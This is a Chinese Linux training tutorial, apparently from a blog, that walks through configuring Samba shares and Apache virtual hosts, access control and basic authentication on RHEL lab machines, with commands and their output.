既然写成了软件，总需要注册商标，因此Tridgwell就申请SMB Server作为该软件的商标。可惜因为SMB是没有意义的文字，没有办法达成注册。既然如此，能不能在字典里面找到相关的字词可以作为商标来注册呢？翻了老半天，发现SAMBA刚好含有SMB，又是热情有劲的拉丁舞蹈的名称，不然就用这个名字来作为商标好了。这成为我们今天所使用的SAMBA的名称的由来。 Samba的作用作用：windows和类unix系统文件共享服务 Samba的软件结构123456789101112131415161718192021# 服务端linux软件 samba samba-commonservice nmb smbdaemon nmbd smbd端口 137 138|139 445配置文件 /etc/samba/smb.conf数据文件 /var/lib/samba日志文件 /var/log/samba# 客户端linux软件 samba-client命令 smbclient smbclient -L ip -U username smbpasswd -a username smbpasswd username smbclient //172.25.0.11/共享名 smbclient //172.25.0.11/共享名 -U student mount -t cifs //172.25.15.11/共享名 /mnt -o guest mount -t cifs //172.25.15.11/共享名 /mnt -o username=student 项目实践1：配置samba共享123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265系统用户############服务器端rhel6############[root@rhel6 ~]# yum install -y samba samba-common[root@rhel6 ~]# service iptables stopiptables: Setting chains to policy ACCEPT: filter [ OK ]iptables: Flushing firewall rules: [ OK ]iptables: Unloading modules: [ OK ][root@rhel6 ~]#[root@rhel6 ~]# service smb startStarting SMB services: [ OK ][root@rhel6 ~]# service nmb startStarting NMB services: [ OK ][root@rhel6 ~]# id studentuid=500(student) gid=500(student) groups=500(student)[root@rhel6 ~]# which smbpasswd/usr/bin/smbpasswd[root@rhel6 ~]# smbpasswd -a studentNew SMB password:Retype new SMB password:Added user student.[root@rhel6 ~]# getsebool -a|grep sambasamba_create_home_dirs --&gt; offsamba_domain_controller --&gt; offsamba_enable_home_dirs --&gt; offsamba_export_all_ro --&gt; offsamba_export_all_rw --&gt; offsamba_portmapper --&gt; offsamba_run_unconfined --&gt; offsamba_share_fusefs --&gt; offsamba_share_nfs --&gt; offsanlock_use_samba --&gt; offuse_samba_home_dirs --&gt; offvirt_use_samba --&gt; off[root@rhel6 ~]# setsebool -P samba_enable_home_dirs 1[root@rhel6 ~]# getsebool -a|grep sambasamba_create_home_dirs --&gt; offsamba_domain_controller --&gt; offsamba_enable_home_dirs --&gt; onsamba_export_all_ro --&gt; offsamba_export_all_rw --&gt; offsamba_portmapper --&gt; offsamba_run_unconfined --&gt; offsamba_share_fusefs --&gt; offsamba_share_nfs --&gt; offsanlock_use_samba --&gt; offuse_samba_home_dirs --&gt; offvirt_use_samba --&gt; off-----------------------------------# 客户端linux——类似ftp的方式访问[root@rhel7 ~]# systemctl stop firewalld[root@rhel7 ~]# yum install -y samba-client[root@rhel7 ~]# smbclient -L 172.25.0.11Enter root\\&apos;s password:Anonymous login successfulDomain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6] Sharename Type Comment --------- ---- ------- IPC$ IPC IPC Service (Samba Server Version 3.6.9-164.el6)Anonymous login successfulDomain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6] Server Comment --------- ------- RHEL6 Samba Server Version 3.6.9-164.el6 Workgroup Master --------- ------- MYGROUP RHEL6[root@rhel7 ~]# smbclient -L 172.25.0.11 -U studentEnter student\\&apos;s password:Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6] Sharename Type Comment --------- ---- ------- IPC$ IPC IPC Service (Samba Server Version 3.6.9-164.el6) student Disk Home DirectoriesDomain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6] Server Comment --------- ------- RHEL6 Samba Server Version 3.6.9-164.el6 Workgroup Master --------- ------- MYGROUP RHEL6[root@rhel7 ~]# smbclient //172.25.0.11/student -U studentEnter student\\&apos;s password:Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]smb: \\&gt;smb: \\&gt; lsNT_STATUS_ACCESS_DENIED listing \\*smb: \\&gt; ls . D 0 Thu Jul 2 04:01:16 2015 .. D 0 Thu Jul 2 03:57:29 2015 .ssh DH 0 Thu Jul 2 04:01:07 2015 .bashrc H 124 Tue Jul 9 09:24:50 2013 .bash_logout H 18 Tue Jul 9 09:24:50 2013 .mozilla DH 0 Thu Jul 2 03:36:20 2015 .bash_history H 5 Thu Jul 2 04:01:16 2015 .gnome2 DH 0 Wed Jul 14 11:55:40 2010 .bash_profile H 176 Tue Jul 9 09:24:50 2013 49584 blocks of size 8192. 45708 blocks availablesmb: \\&gt; exit-------------------------------------------------------------# 客户端windows打开浏览器输入\\\\172.25.0.11\\输入student和uplooking密码后就可以进入服务器中的用户家目录，创建目录aa，以及文件aa下的dd.txt--------------------------------------------------------------# 客户端linux[root@rhel7 ~]# smbclient //172.25.0.11/student -U studentEnter student\\&apos;s password:Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]smb: \\&gt; ls . D 0 Thu Aug 4 04:30:31 2016 .. D 0 Thu Jul 2 03:57:30 2015 .ssh DH 0 Thu Jul 2 04:01:07 2015 aa D 0 Thu Aug 4 04:30:28 2016 .bashrc H 124 Tue Jul 9 09:24:50 2013 .bash_logout H 18 Tue Jul 9 09:24:50 2013 .mozilla DH 0 Thu Jul 2 03:36:20 2015 .bash_history H 5 Thu Jul 2 04:01:16 2015 .gnome2 DH 0 Wed Jul 14 11:55:40 2010 .bash_profile H 176 Tue Jul 9 09:24:50 2013 49584 blocks of size 8192. 45707 blocks availablesmb: \\&gt; get aaNT_STATUS_FILE_IS_A_DIRECTORY opening remote file \\aasmb: \\&gt; cd aasmb: \\aa\\&gt; ls . D 0 Thu Aug 4 04:30:28 2016 .. D 0 Thu Aug 4 04:30:31 2016 dd.txt A 2 Thu Aug 4 04:31:01 2016 49584 blocks of size 8192. 45707 blocks availablesmb: \\aa\\&gt; get dd.txtgetting file \\aa\\dd.txt of size 2 as dd.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)可以查看到了。********************************************************************=====================================================================匿名用户############服务器端rhel6############1.创建共享目录/var/lib/samba/share[root@rhel6 ~]# mkdir /var/lib/samba/share2.修改配置文件[root@rhel6 ~]# vim /etc/samba/smb.conf[public] comment = Public Stuff path = /var/lib/samba/share public = yes writable = yes3.重启服务[root@rhel6 ~]# service smb restartShutting down SMB services: [ OK ]Starting SMB services: [ OK ][root@rhel6 ~]# service nmb restartShutting down NMB services: [ OK ]Starting NMB services: [ OK ]4.修改共享目录的UGO权限[root@rhel6 ~]# ll -d /var/lib/samba/sharedrwxr-xr-x. 2 root root 4096 Aug 5 10:27 /var/lib/samba/share[root@rhel6 ~]# grep nobody /etc/passwdnobody:x:99:99:Nobody:/:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin[root@rhel6 ~]# chown nobody. /var/lib/samba/share[root@rhel6 ~]# ll -d /var/lib/samba/sharedrwxr-xr-x. 2 nobody nobody 4096 Aug 5 10:27 /var/lib/samba/share[root@rhel6 ~]# touch /var/lib/samba/share[root@rhel6 ~]# touch /var/lib/samba/share/smb-file{1..5}[root@rhel6 ~]# chown nobody. /var/lib/samba/share -R[root@rhel6 ~]# service smb stopShutting down SMB services: [ OK ][root@rhel6 ~]# service smb startStarting SMB services: [ OK ]############客户端rhel7############[root@rhel7 ~]# smbclient -L 172.25.0.11Enter root\\&apos;s password:Anonymous login successfulDomain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6] Sharename Type Comment --------- ---- ------- public Disk Public Stuff IPC$ IPC IPC Service (Samba Server Version 3.6.9-164.el6)Anonymous login successfulDomain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6] Server Comment --------- ------- RHEL6 Samba Server Version 3.6.9-164.el6 Workgroup Master --------- ------- MYGROUP RHEL6[root@rhel7 ~]# smbclient //172.25.0.11/publicEnter root\\&apos;s password:Anonymous login successfulDomain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]smb: \\&gt; ls . D 0 Thu Aug 4 22:32:12 2016 .. D 0 Thu Aug 4 22:30:52 2016 smb-file4 N 0 Thu Aug 4 22:32:12 2016 smb-file2 N 0 Thu Aug 4 22:32:12 2016 smb-file5 N 0 Thu Aug 4 22:32:12 2016 smb-file1 N 0 Thu Aug 4 22:32:12 2016 smb-file3 N 0 Thu Aug 4 22:32:12 2016 34505 blocks of size 524288. 26941 blocks availablesmb: \\&gt; get smb-file1getting file \\smb-file1 of size 0 as smb-file1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)smb: \\&gt; put rhel7putting file rhel7 as \\rhel7 (0.0 kb/s) (average 0.0 kb/s)smb: \\&gt; ls . D 0 Thu Aug 4 22:34:46 2016 .. D 0 Thu Aug 4 22:30:52 2016 smb-file4 N 0 Thu Aug 4 22:32:12 2016 rhel7 A 0 Thu Aug 4 22:34:46 2016 smb-file2 N 0 Thu Aug 4 22:32:12 2016 smb-file5 N 0 Thu Aug 4 22:32:12 2016 smb-file1 N 0 Thu Aug 4 22:32:12 2016 smb-file3 N 0 Thu Aug 4 22:32:12 2016 34505 blocks of size 524288. 26941 blocks availablesmb: \\&gt; exit############客户端windows############打开浏览器输入\\\\172.25.0.11\\就能看到public了=================================================================～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～以类似nfs挂接的方式来共享samba###客户端###mount -t cifs //172.25.0.11/student /mnt -o username=studentuplooking1.安装软件cifs-utils[root@rhel7 ~]# yum install -y cifs-utils2.mount挂载[root@rhel7 ~]# mount -t cifs //172.25.0.11/student /mnt -o username=studentPassword for student@//172.25.0.11/student: *********[root@rhel7 ~]# mount|tail -n 1//172.25.0.11/student on /mnt type cifs (rw,relatime,vers=1.0,cache=strict,username=student,domain=RHEL6,uid=0,noforceuid,gid=0,noforcegid,addr=172.25.0.11,unix,posixpaths,serverino,acl,rsize=1048576,wsize=65536,actimeo=1)[root@rhel7 ~]# cd /mnt[root@rhel7 mnt]# lltotal 1024-rwxrw-r--. 1 500 500 8 Aug 4 22:15 file-student.txtdrwxr-xr-x. 2 500 500 0 Aug 4 22:19 windows3.可以设置开机自动挂载，/etc/bashrc或者/etc/profile中 Samba的主配置文件/etc/samba/smb.conf详细解析12345678910111213141516171819202122232425262728293031323334353637383940首先是全局配置【global】 workgroup = MYGROUP --&gt;工作组，工作组是windows上的概念 server string = Samba Server Version %v --&gt;关于samba的说明 netbios name = MYSERVER --&gt;网络名称; interfaces = lo eth0 192.168.12.2/24 192.168.13.2/24 --&gt;接口网段信息; hosts allow = 127. 192.168.12. 192.168.13. --&gt;允许哪些机器来访问共享; max protocol = SMB2【logging options】 关于日志的配置 log file = /var/log/samba/log.%m 日志存放的位置，%m代表日期 max log size = 50 日志的大小限制为50K【 Standalone Server Options 】 关于安全级别的相关配置 security = user --&gt; user代表需要用户名和密码，密码与下面的passdb backend有关，share代表任何来都可以直接访问，server指的是使用外部的密码，需要提供password server = IP的设置值才行。 passdb backend = tdbsam --&gt;数据库格式，默认的格式是tdbsam，文职被放置到/var/lib/samba/private/passwd.tdb【 Share Definitions 】[homes] --&gt;默认情况用户家目录的共享信息 comment = Home Directories browseable = no writable = yes; valid users = %S; valid users = MYDOMAIN\\%S[printers] --&gt;关于打印机的配置，这是一些例子。下面跟上了一些选项。 path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes[sharesmb] --&gt;共享目录名 comment = 说明 path = /test --&gt;共享路径 public = yes --&gt;是否所有人都能够访问 writable = yes --&gt;是否可以写 printable = no --&gt;是否打印，默认是no，写了yes会直接被传递到打印机，可以省略该行 write list = +staff --&gt;可写用户列表。我们这里先把这行删掉。 browsable=no --&gt;是否可浏览，如果是yes则默认隐藏。 hosts allow= 用来限制主机和网段。谁可以访问。","link":"/2016/12/23/booboo_easy_service/04_samba/"},{"title":"APACHE WEB服务","text":"Web基础我们平时上网的时候，输入网址的时候都会输入什么，www.baidu.com，对不对，那么这个www是什么呢？这个www代表的是world wide web，WWW可以让Web客户端（常用浏览器）访问浏览Web服务器上的页面。 它是一个由许多互相链接的超文本组成的系统，通过互联网访问，在这个系统中，每个有用的事物，称为一样“资源”；并且由一个全局“统一资源标识符”（URL）标识；这些资源通过超文本传输协议（Hypertext Transfer Protocol）传送给用户，而后者通过点击链接来获得资源。 HTTP是Hypertext Transfer Protocol的缩写，即超文本传输协议。 顾名思义，HTTP提供了访问超文本信息的功能，是WWW浏览器和WWW服务器之间的应用层通信协议。HTTP协议是用于分布式协作超文本信息系统的、通用的、面向对象的协议。通过扩展命令，它可用于类似的任务，如域名服务或分布式面向对象系统。WWW使用HTTP协议传输各种超文本页面和数据。 网页文件是用HTML（标准通用标记语言下的一个应用）编写的，可在WWW上传输，能被浏览器识别显示的文本文件。其扩展名是.htm和.html。 Web的服务器最常见的有windows上的IIS，还有linux上的apache。另外还有例如nginx等的轻量级服务器。都是比较常用的一些服务器。我们基础课主要简单介绍一些apache的一个简单搭建。 Apache的简介 HTTP (Web) server、开源、1995年 官网： http://httpd.apache.org/ Apache 起初由 Illinois 大学 Urbana-Champaign 的国家高级计算程序中心开发。此后，Apache 被开放源代码团体的成员不断的发展和加强。Apache 服务器拥有牢靠可信的美誉，已用在超过半数的因特网站中－特别是几乎所有最热门和访问量最大的网站。 开始，Apache只是Netscape网页服务器（现在是Sun ONE）的之外的开放源代码选择。渐渐的，它开始在功能和速度。超越其他的基于Unix的HTTP服务器。1996年4月以来，Apache一直是Internet上最流行的HTTP服务器: 1999年5月它在 57% 的网页服务器上运行；到了2005年7月这个比例上升到了69%。 作者宣称因为这个名字好记才在最初选择它，但是流传最广的解释是（也是最显而易见的）:这个名字来自这么一个事实:当Apache在1995年初开发的时候，它是由当时最流行的HTTP服务器NCSA HTTPd 1.3 的代码修改而成的，因此是“一个修补的（a patchy）”服务器。然而在服务器官方网站的FAQ中是这么解释的:“‘Apache’这个名字是为了纪念名为Apache(印地语)的美洲印第安人土著的一支，众所周知他们拥有高超的作战策略和无穷的耐性”。 Apache的软件名称就叫做httpd，这里要注意一下，这里我们以el6作为服务器，el7作为客户端。 Apache的软件结构123456789101112apache软件 httpd rhel6 httpd-2.2.15-29.el6_4.x86_64 rhel7 httpd-2.4.6-17.el7.x86_64service httpddaemon httpd端口 80配置文件 /etc/httpd/conf/httpd.conf /etc/httpd/conf.d/*.conf数据文件 /var/www/ /var/www/uplooking/ www.uplooking.com----网站根目录日志文件 /var/log/httpd Apache虚拟主机方案 基于端口的虚拟主机12www.uplooking.com:80 ----&gt; /var/www/uplooking.com/www.uplooking.com:8080 ----&gt; /var/www/abc.com/ 基于名称的虚拟主机12www.uplooking.com----/var/www/uplooking.com/www.abc.com----/var/www/abc.com/Apache实践 项目实践1：配置基于端口的虚拟主机1234567891011121314151617181920212223 8080---&gt;/var/www/8080.com/*******************************************1)修改主配置文件，打开要监听的端口号[root@rhel6 ~]# vim /etc/httpd/conf/httpd.confListen 80Listen 80802)为不同的虚拟主机创建配置文件[root@rhel6 conf.d]# pwd/etc/httpd/conf.d[root@rhel6 conf.d]# vim 8080.conf&lt;VirtualHost *:8080&gt; ServerAdmin booboo@8080.com DocumentRoot /var/www/8080.com ServerName www.8080.com ErrorLog logs/8080.com-error_log CustomLog logs/8080.com-access_log common&lt;/VirtualHost&gt;3.创建网站根目录，并创建网站默认首页[root@rhel6 conf.d]# mkdir /var/www/8080.com[root@rhel6 conf.d]# echo 8080.com &gt; /var/www/8080.com/index.html4.重启服务[root@rhel6 conf.d]# service httpd start 拓展8081和8082端口 关闭selinux 配置selinux安全上下文，允许httpd监听8081和8082端口123456789[root@rhel6 conf.d]# semanage port -l|grep httphttp_cache_port_t tcp 3128, 8080, 8118, 8123, 10001-10010http_cache_port_t udp 3130http_port_t tcp 80, 81, 443, 488, 8008, 8009, 8443, 9000pegasus_http_port_t tcp 5988pegasus_https_port_t tcp 5989[root@rhel6 conf.d]# semanage port -a -t http_port_t -p tcp 8081[root@rhel6 conf.d]# semanage port -a -t http_port_t -p tcp 8082 项目实践2：配置基于名称的虚拟主机12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 www.taobao.com /var/www/taobao.com/ www.abc.com /var/www/abc.com/*******************************************************#####服务端#####1.修改主配置文件[root@rhel6 conf.d]# vim /etc/httpd/conf/httpd.confNameVirtualHost *:802.创建拓展配置文件[root@rhel6 conf.d]# vim taobao.conf&lt;VirtualHost *:80&gt; ServerAdmin booboo@taobao.com DocumentRoot /var/www/taobao.com ServerName www.taobao.com ErrorLog logs/taobao.com-error_log CustomLog logs/taobao.com-access_log common&lt;/VirtualHost&gt;&lt;Directory &quot;/var/www/taobao.com/&quot;&gt; Options Indexes ==&gt;如果没有对应的index文件，就将该目录下的其他文件罗列出来。&lt;/Directory&gt;[root@rhel6 conf.d]# vim abc.conf[root@rhel6 conf.d]# cat abc.conf&lt;VirtualHost *:80&gt; ServerAdmin booboo@abc.com DocumentRoot /var/www/abc.com ServerName www.abc.com ErrorLog logs/abc.com-error_log CustomLog logs/abc.com-access_log common&lt;/VirtualHost&gt;&lt;Directory &quot;/var/www/abc.com/&quot;&gt; Options Indexes&lt;/Directory&gt;[root@rhel6 conf.d]# mkdir /var/www/taobao.com[root@rhel6 conf.d]# mkdir /var/www/abc.com[root@rhel6 conf.d]# echo www.taobao.com &gt; /var/www/taobao.com/index.html[root@rhel6 conf.d]# echo www.abc.com &gt; /var/www/abc.com/index.html[root@rhel6 conf.d]# service httpd restart==================================================================================================#####客户端#####1.安装elinks软件，bash下的一个网站浏览软件[root@rhel7 mnt]# yum install -y elinks2.添加域名解析[root@rhel7 mnt]# cat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6172.25.0.11 www.taobao.com172.25.0.11 www.abc.com3.通过links命令访问www.taobao.com和www.abc.com[root@rhel7 mnt]# links www.taobao.com[root@rhel7 mnt]# links www.abc.com#####-X 带图形化界面的远程登录#####[kiosk@foundation0 Desktop]$ ssh root@172.25.0.10 -XLast login: Fri Aug 5 03:14:10 2016/usr/bin/xauth: file /root/.Xauthority does not exist[root@rhel7 ~]# firefox 项目实践3：配置基于名称的虚拟主机针对某一个目录做限制1234567891011121314Directory是针对某一个目录做限制的意思。 Options Indexes的意思代表如果没有对应的index文件，就将该目录下的其他文件罗列出来。 Multiview代表的是多视图 Follow sysmlink代表允许连接到其他目录。 AllowOverride None 最常用的是： Order allow,deny Allow from All deny from 172.25.0.10==&gt;该目录允许所有人，除了172.25.0.11 或者 Order deny,allow deny from All allow from 172.25.0.10==&gt;该目录不允许所有人，除了172.25.0.11 项目实践4：配置基于名称的虚拟主机_别名 别名 alias 作用在访问该目录的时候,无论之前的虚拟主机站点名是什么,会统一转到某一个指定的目录。 Alias /download/ /&quot;var/www/soft/&quot; 访问 download 目录时,无论站点名是什么,都会交给 var/www/soft/ 去处理,注意:代表目录时,最后一个 / 不能省略 项目实践4：配置基于名称的虚拟主机_用户名和密码访问 1）配置文件中添加认证 AllowOverride AuthConfig 2）创建认证文件和用户密码 htpasswd -cmb /etc/httpd/test booboo uplooking 3）新增用户和密码 htpasswd -bm /etc/httpd/test tom uplooking 4）删除用户 htpasswd -D /etc/httpd/test jack 5）修改密码 先删除再创建 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556设置用户和密码&lt;Directory &quot;/var/www/booboo.com/football/&quot;&gt;Options Indexes MultiViews FollowSymLinksAllowOverride AuthConfig#仅有网页认证 ( 账号密码 ) 可覆写 ;AuthName &quot;student&quot;#在要你输入账号与密码的对话窗口中 , 出现的『提示字符』AuthType basic# 认证的类型AuthUserFile &quot;/etc/httpd/test&quot;# 这个目录所使用的账号密码配置文件Require valid-user# 后面接可以使用的账号 , 此处是让该密码文件内的用户都能够登入Order allow,denyAllow from all&lt;/Directory&gt;# 通过htpasswd添加用户和密码[root@rhel6 conf.d]# htpasswd -cmb /etc/httpd/test booboo uplookingAdding password for user student# 再添加一个用户和密码[root@rhel6 www]# htpasswd -bm /etc/httpd/test tom uplookingAdding password for user tom[root@rhel6 www]# htpasswd -bm /etc/httpd/test jack uplookingAdding password for user jack# 查看保存apache用户名和密码的文件内容[root@rhel6 www]# cat /etc/httpd/testbooboo:$apr1$y6g/XYrn$eEOR4WeAPfONSLExj7x2D1tom:$apr1$epxVgzER$Or7.R0.5s3z8FbPKrOS1e1jack:$apr1$Alo3.7mf$3CmcCG9mXp7eEALUsa3YY1# 删除用户[root@rhel6 www]# htpasswd -D /etc/httpd/test jackDeleting password for user jack[root@rhel6 www]# cat /etc/httpd/testbooboo:$apr1$y6g/XYrn$eEOR4WeAPfONSLExj7x2D1tom:$apr1$epxVgzER$Or7.R0.5s3z8FbPKrOS1e1# 修改用户密码只能先删除再创建[root@rhel6 abc.com]# htpasswd --helpUsage: htpasswd [-cmdpsD] passwordfile username htpasswd -b[cmdpsD] passwordfile username password htpasswd -n[mdps] username htpasswd -nb[mdps] username password -c Create a new file. -n Don\\&apos;t update file; display results on stdout. -m Force MD5 encryption of the password. -d Force CRYPT encryption of the password (default). -p Do not encrypt the password (plaintext). -s Force SHA encryption of the password. -b Use the password from the command line rather than prompting for it. -D Delete the specified user.On Windows, NetWare and TPF systems the &apos;-m&apos; flag is used by default.On all other systems, the &apos;-p&apos; flag will probably not work. 项目实践5：在rhel7中搭建apahce，实现以下功能 配置基于名称的虚拟主机 www.abc.com 和 www.uplooking.com 只允许rhel6 172.25.0.11 能够访问 www.uplooking.com 12345678910111213141516171819202122232425262728293031323334rhel6 rhel72.2 2.4order require》eg1:所有请求都被拒绝order deny,allow //先拒绝，后允许deny from all //拒绝所有------------------------------require all denied //拒绝所有》eg2：所有请求都允许order allow，deny //先允许，后拒绝allow from all------------------------------------require all granted》拒绝172.25.0.10/test.uplooking.com 的请求order allow，deny //先允许，后拒绝allow from alldeny from 172.25.0.10-------------------------------------require all grantedrequire no ip 172.25.0.10require no host test.uplooking.com》只允许172.25.3.10和172.25.0.0/24 uplooking.com 的请求order deny，allow //先决绝，后允许deny from allallow from 172.25.3.10allow from 172.25.0.0/24-------------------------------------require all deniedrequire ip 172.25.3.10 172.25.0require host uplooking.comApache配置文件/etc/httpd/conf/httpd.conf1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071721）# ServerRoot “/etc/httpd“ ServerRoot用于指定守护进程httpd的运行目录，httpd在启动之后将自动将进程的当前目录改变为这个目录，因此如果设置文件中指定的文件或目录是相对路径，那么真实路径就位于这个ServerR oot定义的路径之下。2）hhhidFile /var/run/httpd.pid PidFile指定的文件将记录httpd守护进程的进程号，由于httpd能自动复制其自身，因此系统中有多个httpd进程，但只有一个进程为最初启动的进程，它为其他进程的父进程，对这个进程发送信号将影响所有的httpd进程。PidFILE定义的文件中就记录httpd父进程的进程号。　　# Timeout 300 Timeout定义客户程序和服务器连接的超时间隔，超过这个时间间隔（秒）后服务器将断开与客户机的连接。# KeepAlive On 在HTTP 1.0中，一次连接只能作传输一次HTTP请求，而KeepAlive参数用于支持HTTP 1.1版本的一次连接、多次传输功能，这样就可以在一次连接中传递多个HTTP请求。不过只有较新的浏览器才支持这个功能# MaxKeepAliveRequests 100 MaxKeepAliveRequests为一次连接可以进行的HTTP请求的最大请求次数。将其值设为0将支持在一次连接内进行无限次的传输请求。事实上没有客户程序在一次连接中请求太多的页面，通常达不到这个上限就完成连接了。# KeepAliveTimeout 15 KeepAliveTimeout测试一次连接中的多次请求传输之间的时间，如果服务器已经完成了一次请求，但一直没有接收到客户程序的下一次请求，在间隔超过了这个参数设置的值之后，服务器就断开连接。# ThreadsPerChild 50 设置服务器使用进程的数目。这是以服务器的响应速度为准的, 数目太大则会变慢# MaxRequestsPerChild 30 使用子进程的方式提供服务的Web服务，常用的方式是一个子进程为一次连接服务，这样造成的问题就是每次连接都需要生成、退出子进程的系统操作，使得这些额外的处理过程占据了计算机的大量处理能力。因此最好的方式是一个子进程可以为多次连接请求服务，这样就不需要这些生成、退出进程的系统消耗，Apache就采用了这样的方式，一次连接结束后，子进程并不退出，而是停留在系统中等待下一次服务请求，这样就极大的提高了性能。但由于在处理过程中子进程要不断的申请和释放内存，次数多了就会造成一些内存垃圾，就会影响系统的稳定性，并且影响系统资源的有效利用。因此在一个副本处理过一定次数的请求之后，就可以让这个子进程副本退出，再从原始的htt pd进程中重新复制一个干净的副本，这样就能提高系统的稳定性。这样，每个子进程处理服务请求次数由MaxRe questPerChild定义。 缺省的设置值为30，这个值对于具备高稳定性特点的FreeBSD系统来讲是过于保守的设置，可以设置为1000甚至更高，设置为0支持每个副本进行无限次的服务处理。　　　　# ServerAdmin root@localhost 配置文件中应该改变的也许只有ServerAdmin， 这一项用于配置WWW服务器的管理员的email地址，这将在HTTP服务出现错误的条件下返回给浏览器，以便让Web使用者和管理员联系，报告错误。习惯上使用服务器上的webmaster作为WWW服务器的管理员，通过邮件服务器的别名机制，将发送到webmaster 的电子邮件发送给真正的Web管理员。# ServerName localhost 缺省情况下，并不需要指定这个ServerName参数，服务器将自动通过名字解析过程来获得自己的名字，但如果服务器的名字解析有问题（通常为反向解析不正确），或者没有正式的DNS名字，也可以在这里指定I P地址。当ServerName设置不正确的时候，服务器不能正常启动。通常一个Web服务器可以具有多个名字，客户浏览器可以使用所有这些名字或IP地址来访问这台服务器，但在没有定义虚拟主机的情况下，服务器总是以自己的正式名字回应浏览器。ServerName就定义了Web服务器自己承认的正式名字，例如一台服务器名字（在DNS中定义了A类型）为freebsd.exmaple.org.cn，同时为了方便记忆还定义了一个别名（CNAME记录）为www.exmaple.org.cn，那么Apache自动解析得到的名字就为freebsd.example.org.cn，这样不管客户浏览器使用哪个名字发送请求，服务器总是告诉客户程序自己为freebsd.example.org.cn。虽然这一般并不会造成什么问题，但是考虑到某一天服务器可能迁移到其他计算机上，而只想通过更改DNS中的www别名配置就完成迁移任务，所以不想让客户在其书签中使用 freebsd记录下这个服务器的地址，就必须使用ServerName来重新指定服务器的正式名字。　　3）# DocumentRoot “/var/www/html“ DocumentRoot定义这个服务器对外发布的超文本文档存放的路径，客户程序请求的UR L就被映射为这个目录下的网页文件。这个目录下的子目录，以及使用符号连接指出的文件和目录都能被浏览器访问，只是要在URL上使用同样的相对目录名。注意，符号连接虽然逻辑上位于根文档目录之下，但实际上可以位于计算机上的任意目录中，因此可以使客户程序能访问那些根文档目录之外的目录，这在增加了灵活性的同时但减少了安全性。Apache在目录的访问控制中提供了FollowSymLinks选项来打开或关闭支持符号连接的特性。4）# &lt;Directory /&gt;　　 Options FollowSymLinks　　 AllowOverride None　　&lt;/Directory&gt; Apache服务器可以针对目录进行文档的访问控制，然而访问控制可以通过两种方式来实现，一个是在设置文件 httpd.conf（或access.conf）中针对每个目录进行设置，另一个方法是在每个目录下设置访问控制文件，通常访问控制文件名字为.htaccess。虽然使用这两个方式都能用于控制浏览器的访问，然而使用配置文件的方法要求每次改动后重新启动httpd守护进程，比较不灵活，因此主要用于配置服务器系统的整体安全控制策略，而使用每个目录下的.htaccess文件设置具体目录的访问控制更为灵活方便.　 由于Apache对一个目录的访问控制设置是能够被下一级目录继承的，因此对根目录的设置将影响到它的下级目录。注意由于AllowOverride None的设置，使得Apache服务器不需要查看根目录下的访问控制文件，也不需要查看以下各级目录下的访问控制文件，直至httpd.conf（或access.conf ）中为某个目录指定了允许Alloworride，即允许查看访问控制文件。由于Apache对目录访问控制是采用的继承方式，如果从根目录就允许查看访问控制文件，那么Apache就必须一级一级的查看访问控制文件，对系统性能会造成影响。而缺省关闭了根目录的这个特性，就使得Apache从httpd.conf中具体指定的目录向下搜寻，减少了搜寻的级数，增加了系统性能。因此对于系统根目录设置AllowOverride None不但对于系统安全有帮助，也有益于系统性能。　　&lt;Directory /&gt; Options Indexes FollowSymLinks　　 AllowOverride None　　 Order allow,deny　　 Allow from all　　&lt;/Directory&gt; 这里定义的是系统对外发布文档的目录的访问设置，设置不同的AllowOverride选项，以定义配置文件中的目录设置和用户目录下的安全控制文件的关系，而Options选项用于定义该目录的特性。# ErrorLog /var/log/httpd-error.log　　LogLevel warn　　LogFormat “%h %l %u %t \\“%r\\“ %&gt;s %b \\“%{Referer}i\\“ \\“%{User-Agent}i\\““ combined　　LogFormat “%h %l %u %t \\“%r\\“ %&gt;s %b“ common　　LogFormat “%{Referer}i -&gt; %U“ referer　　LogFormat “%{User-agent}i“ agent　　#CustomLog /var/log/httpd-access.log common　　#CustomLog /var/log/httpd-referer.log referer　　#CustomLog /var/log/httpd-agent.log agent　　CustomLog /var/log/httpd-access.log combined 这里定义了系统日志的形式，对于服务器错误记录，由ErrorLog、LogLevel 来定义不同的错误日志文件及其记录内容。 这是通过在 CustomLog中指定不同的记录类型来完成的。common表示普通的对单页面请求访问记录，referer表示每个页面的引用记录，可以看出一个页面中包含的请求数，agent表示对客户机的类型记录，显然可以将现有的combined 定义的设置行注释掉，并使用common、referer和agent作为CustomLog的参数，来为不同种类的日志分别指定日志记录文件。显然，LogFormat是用于定义不同类型的日志进行记录时使用的格式， 这里使用了以%开头的宏定义，以记录不同的内容。如果这些参数指定的文件使用的是相对路径，那么就是相对于ServerRoot的路径。# Alias /icons/ “/usr/local/www/icons/“　　 Options Indexes MultiViews　　 AllowOverride None　　 Order allow,deny　　 Allow from all Alias参数用于将URL与服务器文件系统中的真实位置进行直接映射，一般的文档将在DocumentRoot 